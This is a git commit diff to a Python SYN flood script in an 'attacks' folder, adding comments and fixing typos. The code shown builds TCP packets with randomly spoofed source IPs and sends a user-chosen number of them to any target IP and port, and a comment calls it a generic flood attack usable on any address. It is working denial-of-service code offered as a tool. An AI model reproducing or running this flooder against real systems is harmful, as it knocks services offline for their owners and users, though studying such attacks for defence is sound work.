95d001f3c14bf8b4bf25af4b21a8479b470e8915
nathanrauf <nathanrauf@gmail.com>
2019-03-31 15:51:08 -0400

    added some comment to the SYN flood

--- attacks/SYN flood/synflood.py
+++ attacks/SYN flood/synflood.py
@@ -17,16 +17,21 @@ def randInt():
 
 
 def SYN_Flood(targetIP, targetPort, counter):
-    total = 0
+    total = 0 # total number of packets sent to the target
     print
-    "Packets are being sent to the taret ..."
+    "Packets are being sent to the target ..."
     for x in range(0, counter):
         s_port = randInt()
         s_eq = randInt()
         w_indow = randInt()
 
+        # randomly generate all of these values (s_port, s_eq, w_indow using randInt() function
+
         IP_Packet = IP()
         IP_Packet.src = randomIP()
+
+        # randomly generate IP address to be sending packets from
+
         IP_Packet.dst = targetIP
 
         TCP_Packet = TCP()
@@ -44,16 +49,18 @@ def SYN_Flood(targetIP, targetPort, counter):
 def info():
     os.system("clear")
 
+    # targetIP and targetPort are to be set to the IP and port of the server/client.
+    # this attack is currently built as a generic SYN flood attack to be used on any address, dynamically
 
-    dstIP = raw_input("\nPlease input the target IP : ")
-    dstPort = input("Input the target Port : ")
+    targetIP = raw_input("\nPlease input the target IP : ")
+    targetPort = input("Input the target Port : ")
 
-    return dstIP, int(dstPort)
+    return targetIP, int(targetPort)
 
 
 def main():
     dstIP, dstPort = info()
-    counter = input("Pleas input how many packets do you want to send : ")
+    counter = input("Please input how many packets do you want to send : ")
     SYN_Flood(dstIP, dstPort, int(counter))
 
 
